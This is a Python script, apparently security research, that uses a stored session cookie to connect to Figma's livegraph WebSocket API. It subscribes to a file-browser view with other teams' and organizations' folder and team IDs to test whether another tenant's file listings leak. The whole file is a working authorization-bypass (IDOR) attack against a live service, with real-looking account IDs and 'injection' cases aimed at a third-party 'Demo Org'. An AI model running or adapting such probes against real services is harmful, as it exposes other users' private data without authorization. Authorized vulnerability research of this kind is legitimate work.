"""FileBrowserTeamPageFolderItemsView folder 级注入重跑(B 新 cookie):
基线:B→B_team(应返回 B 的文件夹/文件列表)
注入:B→A_team / 随机 teamId(若返回 A 内容 → 越权)
view 定义:args=[compositeParentResourceId, resourceType, firstPageSize, sortOrder, sortColumn]
fields: folderItemsByResourceType"""
import sys, json, asyncio, io
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_TEAM = "1666382706663462213"
B_TEAM = "1667396394890946753"
B_FOLDER = "636027532"  # B 的 "Team folder"(FavoritedProject resourceId)
DEMO_FOLDER = "355763952"  # 公开文件 bv2nMIdFf4u3dESGail4sm 的 folderId(Demo Org)
DEMO_TEAM = "1484993099407069875"  # 公开文件 teamId
DEMO_ORG = "1484997479016537761"
B_UID = "1667396392129259941"
B_ANON = "e101e166-c8ed-43ac-bb3e-89903f418397"
COMMIT = "aeddb9472f99bd8829192d4263f27d7a6d5cef8e"
CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
HASH = "ab" * 16

def lg_url(client_url="bv2nMIdFf4u3dESGail4sm"):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds"
            f"&userId={B_UID}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth():
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": B_UID, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": "https://www.figma.com/files"},
            "clientRequestedVersion": 2}

async def sub(label, args, wait=10):
    frames = []
    try:
        async with websockets.connect(lg_url(),
                                      additional_headers={"User-Agent": UA, "Cookie": CK_B,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth()))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": "FileBrowserTeamPageFolderItemsView",
                                      "viewHash": HASH, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        return
    hits = [f for f in frames if '"initial":' in f or 'viewSubscriptionFailed' in f]
    total = sum(len(f) for f in hits)
    print(f"\n[{label}] 帧={len(frames)} 有效={len(hits)} 总B={total}")
    for f in hits:
        if 'viewSubscriptionFailed' in f:
            print(f"  🚫 {f[:300]}")
        else:
            print(f"  🖼 {len(f)}B {f[:900]}")
            print()

async def main():
    print("======== FileBrowserTeamPageFolderItemsView folder 级注入(B 登录) ========")
    # 基线 1: B → B_team, resourceType=team
    await sub("B→B_team(基线)", {"compositeParentResourceId": B_TEAM, "resourceType": "team",
                                 "firstPageSize": 25, "sortOrder": "DESC", "sortColumn": "touchedAt"})
    # 注入 1: B → A_team ⭐
    await sub("B→A_team ⭐注入", {"compositeParentResourceId": A_TEAM, "resourceType": "team",
                                 "firstPageSize": 25, "sortOrder": "DESC", "sortColumn": "touchedAt"})
    # 基线 2: B → B folder
    await sub("B→B_folder(基线)", {"compositeParentResourceId": B_FOLDER, "resourceType": "folder",
                                   "firstPageSize": 25, "sortOrder": "DESC", "sortColumn": "touchedAt"})
    # 注入 2: B → Demo folder ⭐⭐(公开文件所在 folder,跨 org)
    await sub("B→Demo_folder ⭐⭐", {"compositeParentResourceId": DEMO_FOLDER, "resourceType": "folder",
                                    "firstPageSize": 25, "sortOrder": "DESC", "sortColumn": "touchedAt"})
    # 注入 3: B → Demo team ⭐
    await sub("B→Demo_team ⭐", {"compositeParentResourceId": DEMO_TEAM, "resourceType": "team",
                                "firstPageSize": 25, "sortOrder": "DESC", "sortColumn": "touchedAt"})
    # 对照:随机 teamId
    await sub("B→随机team(对照)", {"compositeParentResourceId": "9999999999999999999", "resourceType": "team",
                                  "firstPageSize": 25, "sortOrder": "DESC", "sortColumn": "touchedAt"})

asyncio.run(main())
